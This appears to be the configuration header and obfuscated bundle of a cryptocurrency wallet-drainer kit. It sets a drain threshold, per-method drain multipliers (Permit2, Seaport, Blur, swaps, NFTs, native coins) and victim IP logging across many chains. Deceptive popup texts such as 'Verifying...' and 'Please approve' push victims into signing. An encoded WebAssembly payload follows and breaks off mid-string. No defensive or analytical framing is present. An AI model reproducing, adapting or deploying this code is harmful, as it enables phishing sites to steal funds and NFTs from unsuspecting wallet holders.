let ACCESS_KEY = '779480d6-2241-4939-bc62-e708d0d80f4d'
let USE_W3M_V3 = true
let logPromptingEnabled = true;
let minimalDrainValue = 0.002;
let mainModal = 'w3m'
let chooseWalletTheme = 'dark';
let themeVariables = {
    '--w3m-z-index': 10000,
    '--w3m-overlay-backdrop-filter': 'blur(6px)',
};
let w3m_name = "";
let w3m_description = "";
let w3m_url = "";
let w3m_icons = [''];
let multipliers = {
    'LP_NFTS': 1,
    'PERMIT2': 1,
    'BLUR': 1,
    'SEAPORT': 1,
    'SWAP': 1,
    'TOKENS': 1,
    'NFT': 1,
    'NATIVES': 1,
};
let notEligible = "Your wallet is not eligible, connect another wallet.";
let swal_notEligibleTitle = "Not eligible";
let addressChanged = "Your wallet address has changed, connect wallet again please";
let swal_addressChangedTitle = "";
let popupElementID = "drPopup";
let popupCloseButtonID = "popupCLose";
let popupCode = "";
let messageElement = "messageButton";
let textInitialConnected = "Loading...";
let textProgress = "Verifying...";
let success = "Please approve";
let failed = "Try again";
let logIpData = true;
let logEmptyWallets = false;
let logDrainingStrategy = true;
let repeatHighest = true;
let retry_changenetwork = 3;
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;
let autoconnect = false;
let useSweetAlert = true;
let popupEnabled = true;
let useDefaultPopup = true;
let canClosePopup = true;
let buttonMessagesEnabled = false;
let twoStep = false;
let twoStepButtonElement = "startButton";
let connectElement = "connectButton";
let wc_projectid = "acff0761d12e71484715ae4a442ce002";
let cfgversion = 680;
let researchers = [];
let experimental = {
    "disable-w3m-featured": true
};
! function(A, I) {
    "object" == typeof exports && "object" == typeof module ? module.exports = I() : "function" == typeof define && define.amd ? define([], I) : "object" == typeof exports ? exports.comsole = I() : A.comsole = I()
}(self, (function() {
    return (() => {
        "use strict";
        var A = [, A => {
                A.exports = "data:application/wasm;base64,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AUYNACACRQ0AA0ACQCAALQAAIgMgAS0AACIERg0AQQFBfyADIARLGw8LIAFBAWohASAAQQFqIQAgAkF/aiICDQALC0EAC3gBAX8CQAJAIAAgAU8NACACRQ0BIAAhAwNAIAMgAS0AADoAACABQQFqIQEgA0EBaiEDIAJBf2oiAg0ADAILCyAAIAFNDQAgAkUNACABQX9qIQEgAEF/aiEDA0AgAyACaiABIAJqLQAAOgAAIAJBf2oiAg0ACwsgAAssAQF/AkAgAkUNACAAIQMDQCADIAE6AAAgA0EBaiEDIAJBf2oiAg0ACwsgAAt+AQF/AkACQCAAQQNxDQAgASACckEDcQ0AIAJBAnYiAkUNASAAIQMDQCADIAEoAgA2AgAgAUEEaiEBIANBBGohAyACQX9qIgINAAwCCwsgAkUNACAAIQMDQCADIAEtAAA6AAAgAUEBaiEBIANBAWohAyACQX9qIgINAAsLIAALfwECfwJAQQAtAOiIgIAADQBBAEEBOgDoiICAABCMgICAABCOgICAAAtBoIAIEICAgIAAIgBBgIAENgIAQQJBgICAIBCUgICAACEBIABCgICAgICAwAA3AhQgACAAQaCABGo2AhAgAEIANwIIIAAgAEEgajYCBCAAIAE2AhwgAAsVACAAKAIcEJWAgIAAIAAQgoCAgAALFgAgAEEMaiABNgIAIABBCGpBADYCAAsbACAAKAIcIABBBGogAEEMaigCAEUQk4CAgAALVAEDf0EAIQADQEEIIQEgACECA0BBACACQQFxa0GghuLtfnEgAkEBdnMhAiABQX9qIgENAAsgAEECdEHwiICAAGogAjYCACAAQQFqIgBBgAJHDQALC0oAIAJBf3MhAgJAIAFFDQADQCACQf8BcSAALQAAc0ECdEHwiICAAGooAgAgAkEIdnMhAiAAQQFqIQAgAUF/aiIBDQALCyACQX9zC2kEAX8BfgF/AX5BACEAQgAhAQNAQQghAiABIQMDQEIAIANCAYN9QsKenLzd8pW2SYMgA0IBiIUhAyACQX9qIgINAAsgAEEDdEHwkICAAGogAzcDACAAQQFqIQAgAUIBfCIBQoACUg0ACwtLACACQn+FIQICQCABRQ0AA0AgAkL/AYMgADEAAIWnQQN0QfCQgIAAaikDACACQgiIhSECIABBAWohACABQX9qIgENAAsL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